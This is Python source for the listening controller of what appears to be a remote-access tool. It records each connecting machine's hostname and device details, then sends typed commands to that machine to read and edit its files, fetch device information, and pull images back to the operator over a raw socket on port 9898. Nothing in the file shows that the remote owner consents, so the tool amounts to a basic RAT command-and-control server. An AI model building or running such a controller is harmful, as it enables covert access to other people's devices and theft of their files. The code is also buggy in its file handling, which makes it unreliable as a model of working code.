import json
import socket
import sys
import os


def device_log(conn_device_log):
    global path
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'desktop/')
    resource_folder = "./Resources/"
    connected_log_dir = resource_folder + "Connected log/"
    device_directory = "Devices/"
    print('closed-log')
    device_data = json.loads(conn_device_log)
    global dn
    dn = str(device_data["hostname"])
    try:
        path = os.path.join(desktop+"/Resources/Connected log/Devices/", str(device_data["hostname"]))
        os.mkdir(path)
    except OSError as error:
        print(error)

    d = open(path + "/" + str(device_data["hostname"]) + ".json", "w")
    d.write(str(conn_device_log))
    d.close()
    print('f cl')


def create_socket():
    try:
        global s
        global host
        global device_name
        global port
        device_name = socket.gethostname()
        host = socket.gethostbyname(device_name)
        # host = "103.159.249.42"
        s = socket.socket()
        port = 9898
        print('Socket created')
        print('-----DEVICE-DETAILS-------')
        print('Device Name : ' + device_name)
        print('Device IP : ' + host)
        print('Current running port : ', port)
        print('---------------------------------------')
    except socket.error as msg:
        print('socket creation error : ' + str(msg) + '\n' + 'Retrying...')
        create_socket()


def bind_socket():
    try:
        global host
        global port
        global s
        global Addr
        Addr = (host, port)
        print('Binding the port & host' + str(Addr))
        s.bind(Addr)
        s.listen(3)  # no . of connection , should accept , if limit reach out then Error
        print('Waiting of client...')
    except socket.error as msg:
        print(str(msg))


def send_command(conn):
    respone_size = 40000
    line = 0
    # global conn_device_log

    print("***********************************TIPS***************************")
    print("1) TO EDIT EXISTING FILE OR CREATE NEW FILE AND WRITE DATA , TYPE -> 'edit' <- **[WITH OUT QUOTES , "
          "CASE SENSITIVE]")
    print("2) TO READ FILES , TYPE -> 'read' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
    print("3) TO GET DEVICE INFORMATION , TYPE ->'device_info <-'**' [WITH OUT QUOTES, CASE SENSITIVE]")
    print("3) TO EXIT , TYPE -> 'quit' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
    print("***********************************TIPS***************************")

    conn_device_log = conn.recv(2000).decode('utf-8')
    print('bytes 2000')
    device_log(conn_device_log)
    print(conn_device_log)
    while True:

        cmd = input('Send Command [CMD] : ')
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            conn.close()
            sys.exit()
        if cmd == "copy_img":
            conn.send(str.encode(cmd))
            respone_size += 20000
            print("****************************WARNING**********************************")
            print("[RESPONSE SIZE]...", 'Current Max Bytes for This Response : ', respone_size, "....")
            print('Keep your Eye ...', 'This Response is Constantly updating by 20,000 Bytes per a single request: ',
                  respone_size)
            print("****************************WARNING**********************************")
            line += 1
            client_response = str(conn.recv(respone_size), 'utf-8')
            img_file_name = input(('Response : ', client_response, "line : ", line))
            conn.send(str.encode(img_file_name))
            save_img = str(conn.recv(80000), 'utf-8')
            # save_img = bytes.decode(save_img)
            print('recied')
            save_img = bytes(save_img,'utf-8')
            print(save_img, type(save_img))
            if img_file_name[-3:] == "JPG":
                exe = "jpg"
                img_file_name = img_file_name[:-3]
                fw_j = open(path + "/" + img_file_name + exe, 'wb')
                for line_j in save_img:
                    fw_j.write(line_j)
                    fw_j.close()
            else:
                exe = "png"
                img_file_name = img_file_name[:-3]
                fw_p = open(dn + "/" + img_file_name + exe, 'wb')
                for line_p in save_img:
                    fw_p.write(bytes(line_p))
                    fw_p.close()
            print('op')

            print('------FILE SUCCESSFULLY SAVED AS ' + cmd + "---------")

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(respone_size), 'utf-8')
            # client_response = str(conn.recv(20000),'utf-8')
            print("****************************WARNING**********************************")
            respone_size += 20000
            print("[RESPONSE SIZE]...", 'Current Max Bytes for This Response : ', respone_size, "....")
            print('Keep your Eye ...', 'This Response is Constantly updating by 20,000 Bytes per a single request: ',
                  respone_size)
            print("****************************WARNING**********************************")
            line += 1
            print('Response : ', client_response, "line : ", line)


def socket_accept():
    conn, addr = s.accept()  # indirectly conn = socket
    print('Connection has been established! ' + 'IP : '
          + addr[0] + " | Port : " + str(addr))
    send_command(conn)
    conn.close()


def main():
    create_socket()
    bind_socket()
    socket_accept()


# if error the go again

# with open("bhagawad gita.jpg", "rb") as image:
#     f = image.read()
#     b = bytearray(f)
#     print(b[0])
#
while True:
    try:
        main()
    except OSError as er:
        print("MAIN----ERROR")
        print("RETRYING.....")
        print(str(er))
        main()